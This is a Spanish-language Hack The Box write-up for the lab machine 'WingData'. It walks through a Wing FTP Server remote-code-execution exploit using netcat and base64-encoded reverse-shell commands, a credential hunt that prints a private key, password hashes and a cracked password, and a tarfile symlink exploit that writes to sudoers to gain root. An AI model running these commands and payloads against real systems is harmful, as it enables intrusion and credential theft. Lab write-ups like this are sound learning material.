
# WingData

<figure><img src="/files/gMLZrhz2inX5vDyK06N1" alt=""><figcaption></figcaption></figure>

## <mark style="color:$primary;">Información General</mark>

* **Nombre de la máquina:** `WingData`
* **IP:** `10.129.52.235`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟢 Fácil`
* **Fecha:** `07/05/2025`

***

## <mark style="color:$primary;">Reconocimiento Inicial</mark>

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.129.52.235 wingdata.htb" | sudo tee -a /etc/hosts
```

### Escaneo de Puertos

#### Escaneo Simple

```bash
sudo nmap -v -sV -T5 10.129.52.235
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.66
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Solo encontramos puertos comunes (22 y 80) abiertos. Nos centraremos en el servicio web.

### Acceso Web

Accedemos a `http://wingdata.htb` y observamos que parece ser una plataforma para compartir archivos online:

<figure><img src="/files/O670Xjf1so3W53Myx0Zp" alt=""><figcaption></figcaption></figure>

Es una landing page con un formulario de contacto y al pulsar en client portal nos redirire al subdominio `ftp.wingdata.htb`, por lo que lo añadiremos a nuestro /etc/hosts y accederemos.

<figure><img src="/files/hNzSTM7pycPUh28Wi4Lu" alt=""><figcaption></figcaption></figure>

Observamos que es un login de `Wing FTP Server 7.4.3`, lo que nos permite buscar exploit públicos para explotarlo.

Probamos el login anonymous sin contraseña y conseguimos acceder!

<figure><img src="/files/adGpacp0TCbekURwnKZH" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:$primary;">Explotación: Wing FTP Server</mark>

Encontramos el siguiente exploit público para explotar un RCE unauthenticated:

{% embed url="<https://github.com/4m3rr0r/CVE-2025-47812-poc>" %}

#### 1. Setup y confirmación

```bash
git clone https://github.com/4m3rr0r/CVE-2025-47812-poc.git
cd CVE-2025-47812-poc
```

#### 2. Listener Netcat

```bash
nc -nlvp 5555
listening on [any] 5555 ...
```

#### 3. Ejecutar Exploit

```bash
python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "nc 10.10.14.195 5555 -e /bin/sh" -v

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'nc 10.10.14.195 5555 -e /bin/sh' and username: 'anonymous'
[+] UID extracted: 55c7ec0bd25dac86e94de2f79ea944e2f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 55c7ec0bd25dac86e94de2f79ea944e2f528764d624db129b32c21fbca0cb8d6
[-] Error sending GET request to http://ftp.wingdata.htb/dir.html: HTTPConnectionPool(host='ftp.wingdata.htb', port=80): Read timed out. (read timeout=10)
```

#### 4. Recibimos la conexión en Netcat

```bash
nc -nlvp 5555
listening on [any] 5555 ...
connect to [10.10.14.195] from (UNKNOWN) [10.129.59.162] 55480
whoami
wingftp
```

#### 5. Estabilizar shell

Es una dump shell, por lo que la estabilizaremos con Penelope:

{% hint style="info" %}
Usar el payload Netcat + named pipe
{% endhint %}

```bash
penelope -p 5556
(p) # ver payloads

➤  tun0 → 10.10.14.195:5556

Netcat + named pipe
printf KHJtIC90bXAvXztta2ZpZm8gL3RtcC9fO2NhdCAvdG1wL198c2ggMj4mMXxuYyAxMC4xMC4xNC4xOTUgNTU1NiA+L3RtcC9fKSA+L2Rldi9udWxsIDI+JjEgJg==|base64 -d|sh
```

<figure><img src="/files/gxgABc1RdPBoo03BEojT" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:$primary;">Enumeración</mark>

### Claves SSH

Encontramos una clave privada SSH en el directorio al que accedemos `/opt/wftpserver`:

```bash
wingftp@wingdata:/opt/wftpserver$ ls -la
total 26504
drwxr-x---  9 wingftp wingftp     4096 Apr 30 17:18 .
drwxr-xr-x  4 root    root        4096 Feb  9 08:19 ..
drwxr-x---  4 wingftp wingftp     4096 Apr 30 17:18 Data
-rwxr-x---  1 wingftp wingftp     4834 Jul 31  2018 License.txt
drwxr-x---  5 wingftp wingftp     4096 Apr 30 17:29 Log
drwxr-x---  2 wingftp wingftp     4096 Feb  9 08:19 lua
-rw-r--r--  1 wingftp wingftp        5 Apr 30 17:18 pid-wftpserver.pid
-rwxr-x---  1 wingftp wingftp     1434 Sep 13  2020 README
drwxr-x---  2 wingftp wingftp     4096 Apr 30 17:29 session
drwxr-x---  2 wingftp wingftp     4096 Feb  9 08:19 session_admin
-rwxr-x---  1 wingftp wingftp   115258 Mar 26  2025 version.txt
drwxr-x--- 10 wingftp wingftp    12288 Feb  9 08:19 webadmin
drwxr-x--- 13 wingftp wingftp     4096 Feb  9 08:19 webclient
-rwxr-x---  1 wingftp wingftp  4649509 Sep 14  2021 wftpconsole
-rwxr-x---  1 wingftp wingftp     3272 Nov  2 11:11 wftp_default_ssh.key
-rwxr-x---  1 wingftp wingftp     1342 Nov 22  2017 wftp_default_ssl.crt
-rwxr-x---  1 wingftp wingftp     1675 Nov 22  2017 wftp_default_ssl.key
-rwxr-x---  1 wingftp wingftp 22283682 Mar 26  2025 wftpserver
```

Podemos usar esta clave para acceder por SSH directamente o intentar crackear la contraseña con `ssh2john`.

Además también encontramos otras claves privadas SSH que nos podrían dar un mayor acceso o poder crackear la contraseña en plano:

```bash
wingftp@wingdata:/home$ grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"

/opt/wftpserver/Data/ssh_host_ecdsa_key:1:-----BEGIN PRIVATE KEY-----
/opt/wftpserver/Data/ssh_host_key:1:-----BEGIN PRIVATE KEY-----
/opt/wftpserver/wftp_default_ssh.key:1:-----BEGIN PRIVATE KEY-----
/opt/wftpserver/wftp_default_ssl.key:1:-----BEGIN RSA PRIVATE KEY-----
```

Nos interesa la que indica BEGIN RSA PRIVATE KEY:

```
wingftp@wingdata:/home$ cat /opt/wftpserver/wftp_default_ssl.key
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA4qCiFwqgJX9EFvf18bNL4aGllFOpzGTbyS5AKiDwdf6dEcJd
0p9s8PD2So1g+wYmAMD1aUAn9yyvU11oQ5gy+T3PZaPes1bH4ugnq8inwzgy46wP
4eN8CJzrxZvMAkdh/UbNiH8GLELR3Pex1BfrMlkNiO9STcMz7hVA2YhH59eolEJl
sqTOSCgaXbCaDcQpof/Hbz/GtLu34x2LpA6GEvtr78gyuU8MPakISDyXAkaOr2Kp
JEabsq2xqvJTZUZJHAjFk3DREUYlLbY4HF0KjqH1VZtJcerBjNszHTrgR7DMy6FI
MFnlF9jG0sMkG0kAYu55dqoMEiCTXLpgQWyoEwIDAQABAoIBAAZwVeqdrKskEIUu
ilhRpchFVXT/Y4WhH/V5UO1hfjN8Bm5ovU2speW6kuTPW4AGTrIayV4yKnCFXn3Z
24qAGoKmVOwoWb1yq78wpV/mFY4gXKHHU7QxSGbePnygzo0KBiiyCEjmgwBi7Z9/
khfajh4iFZZcZlQ7RZBwHiWQD6rwkfNugXir3iU9ZDLH9FGUoo4Hxr+jh6MvguYR
IIkbifevY3ut41AEI53saiUXJhcKZneAgisPxOwgjTAfwcBClvmvopOfQvFWGp1d
aSxcEbD7epk98OFOaXHmP0SpXo5naVDruNXqQnRMS5RbxrMtkdNr769UnrwKLkx0
OEZx+kECgYEA9AI2KDvXFtNWbtM8sm2+V5wQu78qev7z66kPkaZi1u94VLlhSSL1
WcwLPvy5yA4/oMHghKfYehTMbiBHMZKhvMg4O9D1VVNmWYmVqNH+o4ESwuFJJ+3f
8Tq+7gs0zSi3MHDrUBuDBKcnYeWWntEQ+YsCq4NPXpxFauwMVyL3q4MCgYEA7cPB
UsAJjGiCR7Otf3llN6v41mxmyYymyhXBLRqIVvqhLVapC2wUdEqQ2mlOIFG5usvT
2to0Y5/giHeQwHrhJbl4grZn4fMTOODkiqXDle3GzJ1+HB6sq255maMfNGyFnE8E
63uHW9OUifU8mTtVT5M15SYurEUPWzkQYDGrnDECgYAouX3EdUhOvPL+CC9nMD3G
bXu1ehBi+s5HFK5OhtCUQt94dIAyLq14UT/HQXLYWthvwivwt/q/VV1RO/3l3i00
Ts5j3Vo05Xh9lSLvTC0NqOsyr1sAWQk5P67CGAi1/QemBBKiChVx31wJUMI0u3vz
yiml6oKCrd5AHClrGaDwdQKBgQCkKTFUchTlpc61tOAIkIeLDaisW4IIjJ0oECcl
fhk+fKNGC3yBz2i79jPXKTfw5pxm1Y57n4bmdh9v+aWuz+idxFXpYgmNnufZsKT6
+YJ2BQrqgZ7tyVwMrSU2J8NGzdreVkyeTdbiVs5LBlCFt8qqO4jNozQ8ax40LM0a
rZDAMQKBgDqKPm3qxWkQKeTed6fqmN3WPg9Mr+EZ+7y0/TQEBQISGOpJ5XbhEh32
EBT/Ztr5FQyje0R2flhMQOXFqzIOzpe4JjOm1HQDwflae8hLmd09q4Q/zdhIdF4p
97TVMoWJn1Xcdwl2n9HAS2B+k3KRSzCZNsh4+RI7BJzgv5JltI/5
-----END RSA PRIVATE KEY-----
```

Lo intentamos crackear y usarlo directamente para acceder pero no tenemos éxito:

```bash
ssh2john wftp_default_ssl.key > ssh.hash 
wftp_default_ssl.key has no password!

chmod 600 wftp_default_ssl.key 

ssh -i wftp_default_ssl.key wingftp@wingdata.htb
wingftp@wingdata.htb's password: 
Permission denied, please try again.

ssh -i wftp_default_ssl.key wacky@wingdata.htb
wacky@wingdata.htb's password: 
Permission denied, please try again.
```

### Usuarios

En la home vemos que solo hay un usuario `wacky`:

```bash
wingftp@wingdata:/home$ ls
wacky
wingftp@wingdata:/home$ cd wacky/
bash: cd: wacky/: Permission denied
```

Nuestro usuario wingftp vemos que está presente en varios grupos, entre los que nos llaman la atención `plugdev` y `netdev`:

```bash
wingftp@wingdata:/tmp$ id
uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

### Credenciales expuestas

Enumerando el objetivo encontramos varios archivos XML de usuarios interesantes:

```bash
wingftp@wingdata:/opt/wftpserver/Data/1/users$ ls -la
total 28
drwxr-x--- 2 wingftp wingftp 4096 May  7 10:10 .
drwxr-x--- 4 wingftp wingftp 4096 Feb  9 08:19 ..
-rwxr-x--- 1 wingftp wingftp 2842 May  7 10:10 anonymous.xml
-rwxr-x--- 1 wingftp wingftp 2846 Nov  2  2025 john.xml
-rw-rw-rw- 1 wingftp wingftp 2847 Nov  2  2025 maria.xml
-rw-rw-rw- 1 wingftp wingftp 2847 Nov  2  2025 steve.xml
-rw-rw-rw- 1 wingftp wingftp 2856 Nov  2  2025 wacky.xml
```

Y con técnicas de credential hunting encontramos otros archivos MUY interesantes:

```bash
wingftp@wingdata:/tmp$ for i in $(find / -name *.xml 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done

File:  /opt/wftpserver/Data/_ADMINISTRATOR/admins.xml
File:  /opt/wftpserver/Data/_ADMINISTRATOR/settings.xml
File:  /opt/wftpserver/Data/1/users/maria.xml
File:  /opt/wftpserver/Data/1/users/steve.xml
File:  /opt/wftpserver/Data/1/users/wacky.xml
File:  /opt/wftpserver/Data/1/users/anonymous.xml
File:  /opt/wftpserver/Data/1/users/john.xml
File:  /opt/wftpserver/Data/1/settings.xml
File:  /opt/wftpserver/Data/1/portlistener.xml
File:  /opt/wftpserver/Data/settings.xml
File:  /opt/wftpserver/webadmin/crossdomain.xml
File:  /opt/wftpserver/webclient/crossdomain.xml
```

Leyendo estos XML obtenemos algunos hashes de contraseñas, como la de wacky:

```xml
wingftp@wingdata:/tmp$ cat /opt/wftpserver/Data/1/users/wacky.xml

<?xml version="1.0" ?>
<USER_ACCOUNTS Description="Wing FTP Server User Accounts">
    <USER>
        <UserName>wacky</UserName>
        <EnableAccount>1</EnableAccount>
        <EnablePassword>1</EnablePassword>
        <Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
        <ProtocolType>63</ProtocolType>
        <EnableExpire>0</EnableExpire>
        <ExpireTime>2025-12-02 12:02:46</ExpireTime>
        <MaxDownloadSpeedPerSession>0</MaxDownloadSpeedPerSession>
        <----SNIP---->
```

Y la de admin, junto con un archivo de configuración que nos indica que hay un panel de administración por el puerto 5466:

```xml
wingftp@wingdata:/tmp$ cat /opt/wftpserver/Data/_ADMINISTRATOR/admins.xml
<?xml version="1.0" ?>
<ADMIN_ACCOUNTS Description="Wing FTP Server Admin Accounts">
    <ADMIN>
        <Admin_Name>admin</Admin_Name>
        <Password>a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba</Password>
        <Type>0</Type>
        <Readonly>0</Readonly>
        <IsDomainAdmin>0</IsDomainAdmin>
        <DomainList></DomainList>
        <MyDirectory></MyDirectory>
        <EnableTwoFactor>0</EnableTwoFactor>
        <TwoFactorCode></TwoFactorCode>
    </ADMIN>
</ADMIN_ACCOUNTS>

wingftp@wingdata:/tmp$ cat /opt/wftpserver/Data/_ADMINISTRATOR/settings.xml
<?xml version="1.0" ?>
<Administrator Description="Wing FTP Server Administrator Options">
    <HttpPort>5466</HttpPort>
    <HttpSecure>0</HttpSecure>
    <AdminLogfileEnable>1</AdminLogfileEnable>
    <AdminLogfileFileName>Admin-%Y-%M-%D.log</AdminLogfileFileName>
    <AdminLogfileMaxsize>0</AdminLogfileMaxsize>
    <EnablePortUPnP>0</EnablePortUPnP>
</Administrator>
```

### Cracking de hashes

Me guardo el hash de wacky (usuario que nos interesa comprometer) en un archivo `wacky.hash` y agregué el hash extraído junto con el identificador `WingFTP`, que corresponde al formato de hash del servidor FTP de Wing:

```
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP
```

Y lo crackeamos con hashcat indicándole el modo `-m 1410`:

```bash
hashcat -m 1410 wacky.hash /usr/share/wordlists/rockyou.txt

<----SNIP---->

32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1410 (sha256($pass.$salt))
Hash.Target......: 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b87...ingFTP
Time.Started.....: Thu May  7 22:22:42 2026 (9 secs)
Time.Estimated...: Thu May  7 22:22:51 2026 (0 secs)
```

Tenemos la contraseña en plano de wacky: `!#7Blushing^*Bride5`

***

## <mark style="color:$primary;">User Flag</mark>

Cambiamos al usuario wacky desde la sesión que tenemos abierta o accedemos por SSH con esa contraseña y leemos la user flag:

```bash
wingftp@wingdata:/$ su wacky
Password: 
wacky@wingdata:/$ whoami
wacky
wacky@wingdata:/$ cd /home/wacky/
wacky@wingdata:~$ ls
user.txt
wacky@wingdata:~$ cat user.txt 
4b7734bcd1dc5943a2b2d92a6271386e
```

***

## <mark style="color:$primary;">Escalada de Privilegios</mark>

### Enumeración de Privilegios

```bash
wacky@wingdata:~$ sudo -l
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

Esto indica que el usuario `wacky` tenía permiso para ejecutar el intérprete de Python como **usuario root**, específicamente para ejecutar el script ubicado en:

```
/opt/backup_clients/restore_backup_clients.py
```

Es importante destacar que este comando puede ejecutarse sin necesidad de contraseña gracias a la directiva **NOPASSWD**. Además, la presencia del comodín (`*`) al final del comando permite introducir argumentos arbitrarios en el script.

### Enumeración de script

```python
wacky@wingdata:~$ cat /opt/backup_clients/restore_backup_clients.py

#!/usr/bin/env python3
import tarfile
import os
import sys
import re
import argparse

BACKUP_BASE_DIR = "/opt/backup_clients/backups"
STAGING_BASE = "/opt/backup_clients/restored_backups"

def validate_backup_name(filename):
    if not re.fullmatch(r"^backup_\d+\.tar$", filename):
        return False
    client_id = filename.split('_')[1].rstrip('.tar')
    return client_id.isdigit() and client_id != "0"

def validate_restore_tag(tag):
    return bool(re.fullmatch(r"^[a-zA-Z0-9_]{1,24}$", tag))

def main():
    parser = argparse.ArgumentParser(
        description="Restore client configuration from a validated backup tarball.",
        epilog="Example: sudo %(prog)s -b backup_1001.tar -r restore_john"
    )
    parser.add_argument(
        "-b", "--backup",
        required=True,
        help="Backup filename (must be in /home/wacky/backup_clients/ and match backup_<client_id>.tar, "
             "where <client_id> is a positive integer, e.g., backup_1001.tar)"
    )
    parser.add_argument(
        "-r", "--restore-dir",
        required=True,
        help="Staging directory name for the restore operation. "
             "Must follow the format: restore_<client_user> (e.g., restore_john). "
             "Only alphanumeric characters and underscores are allowed in the <client_user> part (1–24 characters)."
    )

    args = parser.parse_args()

    if not validate_backup_name(args.backup):
        print("[!] Invalid backup name. Expected format: backup_<client_id>.tar (e.g., backup_1001.tar)", file=sys.stderr)
        sys.exit(1)

    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)
    if not os.path.isfile(backup_path):
        print(f"[!] Backup file not found: {backup_path}", file=sys.stderr)
        sys.exit(1)

    if not args.restore_dir.startswith("restore_"):
        print("[!] --restore-dir must start with 'restore_'", file=sys.stderr)
        sys.exit(1)

    tag = args.restore_dir[8:]
    if not tag:
        print("[!] --restore-dir must include a non-empty tag after 'restore_'", file=sys.stderr)
        sys.exit(1)

    if not validate_restore_tag(tag):
        print("[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores", file=sys.stderr)
        sys.exit(1)

    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)
    print(f"[+] Backup: {args.backup}")
    print(f"[+] Staging directory: {staging_dir}")

    os.makedirs(staging_dir, exist_ok=True)

    try:
        with tarfile.open(backup_path, "r") as tar:
            tar.extractall(path=staging_dir, filter="data")
        print(f"[+] Extraction completed in {staging_dir}")
    except (tarfile.TarError, OSError, Exception) as e:
        print(f"[!] Error during extraction: {e}", file=sys.stderr)
        sys.exit(2)

if __name__ == "__main__":
    main()
```

El script es una utilidad de restauración de copias de seguridad basada en Python, diseñada para extraer archivos de copia de seguridad de clientes a un directorio temporal. A partir del código fuente, observé que el script restauraba los archivos de copia de seguridad `.tar` ubicados en el siguiente directorio:

```
/opt/backup_clients/backups
```

#### Argumentos

```bash
wacky@wingdata:~$ /opt/backup_clients/restore_backup_clients.py
usage: restore_backup_clients.py [-h] -b BACKUP -r RESTORE_DIR
restore_backup_clients.py: error: the following arguments are required: -b/--backup, -r/--restore-dir
```

El script necesita 2 argumentos:

1. `-b`: especifica el nombre del archivo de copia de seguridad, que debe seguir el formato `backup_<client_id>.tar`
2. `-r`: especifica el nombre del directorio de restauración, que debe comenzar con `restore_` y contener solo caracteres alfanuméricos y guiones bajos.

La funcionalidad más importante se produjo durante el proceso de extracción:

```python
with tarfile.open(backup_path, "r") as tar:
    tar.extractall(path=staging_dir, filter="data")
```

Esta línea indicaba a Python que extrajera el contenido del archivo tar especificado en el directorio de preparación. Es importante destacar que esta operación se realizó con **privilegios de administrador**, ya que el script se ejecutó mediante sudo.

Esto representó de inmediato una posible vulnerabilidad de escalada de privilegios. Al extraer archivos tar, estos pueden contener enlaces simbólicos o rutas de archivo especialmente diseñadas que podrían provocar que los archivos se escriban fuera del directorio previsto. Si no se gestiona adecuadamente, esto podría permitir sobrescribir archivos confidenciales del sistema o colocar archivos maliciosos en ubicaciones privilegiadas.

### Transferencia y preparación de exploits

Primero, en la máquina de destino, navegué hasta el directorio `/tmp` que se usa habitualmente para el almacenamiento temporal de archivos y al que todos los usuarios pueden escribir:

```bash
wacky@wingdata:~$ cd /tmp
```

A continuación, en mi máquina Kali Linux, cloné el repositorio de prueba de concepto disponible públicamente para **CVE-2025-4517**, que tiene como objetivo la funcionalidad vulnerable de restauración de copias de seguridad utilizada en el sistema:

{% embed url="<https://github.com/AzureADTrent/CVE-2025-4517-POC>" %}

```bash
git clone https://github.com/AzureADTrent/CVE-2025-4517-POC-HTB-WingData.git
cd CVE-2025-4517-POC-HTB-WingData
python3 -m http.server 80
```

Y descargamos el exploit en la máquina objetivo:

```bash
wacky@wingdata:/tmp$ wget http://10.10.14.195/CVE-2025-4517-POC.py
```

#### Ejecutar exploit

Ejecutamos el exploit y obtenemos una root shell:

```bash
wacky@wingdata:/tmp$ python3 CVE-2025-4517-POC.py 

╔═══════════════════════════════════════════════════════════╗
║     CVE-2025-4517 Tarfile Exploit                         ║
║     Privilege Escalation via Symlink + Hardlink Bypass    ║
╚═══════════════════════════════════════════════════════════╝
    
[*] Target user: wacky
[*] Creating exploit tar for user: wacky
[*] Phase 1: Building nested directory structure...
[*] Phase 2: Creating symlink chain for path traversal...
[*] Phase 3: Creating escape symlink to /etc...
[*] Phase 4: Creating hardlink to /etc/sudoers...
[*] Phase 5: Writing sudoers entry...
[+] Exploit tar created: /tmp/cve_2025_4517_exploit.tar
[*] Deploying exploit to: /opt/backup_clients/backups/backup_9999.tar
[+] Exploit deployed successfully
[*] Triggering extraction via vulnerable script...
[+] Backup: backup_9999.tar
[+] Staging directory: /opt/backup_clients/restored_backups/restore_pwn_9999
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_pwn_9999

[+] Extraction completed
[*] Verifying exploit success...
[+] SUCCESS! User 'wacky' added to sudoers
[+] Entry: wacky ALL=(ALL) NOPASSWD: ALL

============================================================
[+] EXPLOITATION SUCCESSFUL!
[+] User 'wacky' now has full sudo privileges
[+] Get root with: sudo /bin/bash
============================================================

[?] Spawn root shell now? (y/n): y

[*] Spawning root shell...
[*] Run: sudo /bin/bash
root@wingdata:/tmp# whoami
root
```

***

## <mark style="color:$primary;">👑</mark> <mark style="color:$primary;">Root Flag</mark>

```bash
root@wingdata:/tmp# cd /root
root@wingdata:~# ls
root.txt
root@wingdata:~# cat root.txt 
d8c696c6c23b62b574eee484********
```
